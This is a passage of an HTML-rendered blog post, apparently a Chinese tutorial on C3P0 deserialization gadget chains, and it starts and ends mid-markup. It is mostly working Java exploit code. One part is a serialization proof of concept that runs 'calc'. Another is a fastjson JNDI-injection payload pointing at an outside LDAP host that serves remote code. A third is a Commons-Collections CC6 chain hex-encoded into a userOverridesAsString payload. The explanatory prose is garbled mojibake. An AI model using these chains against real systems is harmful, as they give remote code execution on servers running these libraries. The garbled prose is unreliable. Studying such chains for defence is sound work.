class="keyword">static</span> <span class="type">byte</span>[] serialize(ConnectionPoolDataSource lp) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> PoolBackedDataSourceBase.class.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(poolBackedDataSourceBase);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(exp);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221501061.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ¬ç™½ä¸€å¼€å§‹çš„å‚»å¸½æ“ä½œï¼ŒæŠŠæ–‡ä»¶æ”¾åŒ…ä¸‹äº†ï¼Œä¸€ç›´ä¸èƒ½å¼¹è®¡ç®—å™¨ï¼Œéƒé—· (çœŸå‚»</p><h2 id="jndiæ³¨å…¥"><a class="markdownIt-Anchor" href="#jndiæ³¨å…¥">#</a> JNDI æ³¨å…¥</h2><p><code>JndiRefForwardingDataSource</code>  çš„ <code>dereference()</code>  æ–¹æ³•ä¸­æœ‰ lookï¼Œå¹¶ä¸” <code>jndiName</code>  é€šè¿‡ <code>getJndiName()</code>  è·å–ï¼Œå¯é€ æˆ JNDI æ³¨å…¥<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221501031.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…ˆçœ‹ä¸‹ <code>getJnDIName</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getJndiName</span><span class="params">()</span></span><br><span class="line">&#123; <span class="keyword">return</span> (jndiName <span class="keyword">instanceof</span> Name ? ((Name) jndiName).clone() : jndiName <span class="comment">/* String */</span>); &#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦æ˜¯ name ç±»å‹ï¼Œä¸æ˜¯åˆ™è¿”å› String ç±»å‹</p><p>ç»§ç»­å‘ä¸Šæ‰¾å¯ä»¥åˆ©ç”¨çš„ç‚¹<br> <code>inner()</code> <br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221501728.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰¾åˆ° <code>setLoginRimeout</code> , å½¢å‚ä¸º <code>int</code>  å‹<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221501244.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸‹é¢å°±æ˜¯ <code>WrapperConnectionPoolDataSource</code>  å’Œ <code>JndiRefConnectionPoolDataSource</code>  çš„åŒåå‡½æ•°<br>åœ¨ <code>JndiRefConnectionPoolDataSource</code> ï¼Œ <code>setLoginTimeout</code> ï¼Œå› ä¸º <code>wcpds</code>  æ˜¯ <code>WrapperConnectionPoolDataSource</code>  ç±»ä¸‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨ <code>WrapperConnectionPoolDataSource</code>  ä¸‹çš„åŒåæ–¹æ³•<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502080.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œä¼šè°ƒç”¨ <code>getNestedDataSource()</code>  å¯¹è±¡<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502045.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›åå‘ç°å…¶å®å°±æ˜¯ <code>JndiRefForwardingDataSource</code> <br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502115.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ä¸‹ä¸€æ­¥å°±çŸ¥é“åˆ°è¿™é‡Œ<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502232.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åé¢å°±ä¼šå»åŠ è½½æˆ‘ä»¬ä¼ å…¥çš„ <code>jndiName</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502088.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="gadget-2"><a class="markdownIt-Anchor" href="#gadget-2">#</a> Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JndiRefConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">WrapperConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setLoginTimeout -&gt;</span><br><span class="line">JndiRefForwardingDataSource#inner -&gt;</span><br><span class="line">JndiRefForwardingDataSource#dereference() -&gt;</span><br><span class="line">Context#lookup</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221502081.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2">#</a> EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://10.6.42.156:8085/NpgoGBfd\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hexåºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#hexåºåˆ—åŒ–">#</a> HEX åºåˆ—åŒ–</h2><p>åœ¨ <code>WrapperConnectionPoolDataSource</code>  çš„æ„é€ æ–¹æ³•ä¸‹</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503151.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è°ƒç”¨äº† <code>C3P0ImplUtils.parseUserOverridesAsString</code></p><p>è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line"><span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line"><span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );</span><br><span class="line"><span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å½“ <code>userOverridesAsString</code>  ä¸ä¸ºç©ºè¿›å…¥ if<br> é¦–å…ˆä¼šç”¨ <code>substring</code>  å¯¹ <code>userOverridesAsString</code>  è¿›è¡Œæˆªå–ï¼Œå°† <code>HASM_HEADER</code>  å¤´å’Œæœ€åä¸€ä½çš„ï¼›æ‰£æ‰<br>è€Œ <code>userOverridesAsString</code>  æ˜¯ä¸€ä¸ªç§æœ‰çš„å¸¸é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HASM_HEADER</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap&quot;</span>;</span><br></pre></td></tr></table></figure><p>å°†åå…­è¿›åˆ¶è½¬æˆå­—èŠ‚æ•°ç»„ï¼Œæœ€åå†å¼ºè½¬ä¸º <code>map</code>  å¯¹è±¡</p><p>è·Ÿè¿› `fromByteArray</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line"><span class="type">Object</span> <span class="variable">out</span> <span class="operator">=</span> deserializeFromByteArray( bytes ); </span><br><span class="line"><span class="keyword">if</span> (out <span class="keyword">instanceof</span> IndirectlySerialized)</span><br><span class="line">    <span class="keyword">return</span> ((IndirectlySerialized) out).getObject();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ€ååˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line"><span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿›è¡Œååºåˆ—åŒ–</p><h3 id="gadget-3"><a class="markdownIt-Anchor" href="#gadget-3">#</a> Gadget</h3><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503290.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource-&gt;</span><br><span class="line">C3P0ImplUtils#parseUserOverridesAsString-&gt;</span><br><span class="line">SerializableUtils#fromByteArray-&gt;</span><br><span class="line">SerializableUtils#deserializeFromByteArray-&gt;</span><br><span class="line">SerializableUtils</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3">#</a> EXP</h3><p>è¿™é‡Œç”¨ CC4 å’Œ CC6 ä¸¾ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0Hex_CC6</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(exp()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;1\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;2\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//ä½ç‰ˆæœ¬åˆ©ç”¨</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span 